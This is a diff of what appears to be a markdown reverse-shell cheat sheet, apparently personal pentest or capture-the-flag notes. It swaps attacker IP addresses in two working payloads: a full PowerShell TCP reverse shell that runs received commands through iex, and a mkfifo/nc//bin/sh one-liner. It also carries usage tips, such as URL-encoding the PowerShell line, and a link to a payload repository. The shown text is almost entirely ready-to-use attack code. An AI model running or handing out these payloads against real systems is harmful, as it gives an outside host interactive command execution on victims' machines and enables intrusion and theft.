@@ -52,7 +52,7 @@ mkfifo /tmp/f; nc <attacker-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/
 
 ##### 5. Powershell reverse shell to exploit a modern Windows Server
 ```powershell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.45.240',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.17.47.177',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 - In order to use this, we need to replace "IP" and "port" with an appropriate IP and choice of port.
 - The above powershell script will work but you need to url encod it first.
@@ -61,4 +61,4 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.45.
 
 **For other common reverse shell payloads visit this repo** --> [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-mkfifo /tmp/f; nc 10.17.47.177 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+mkfifo /tmp/f; nc 10.10.16.29 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
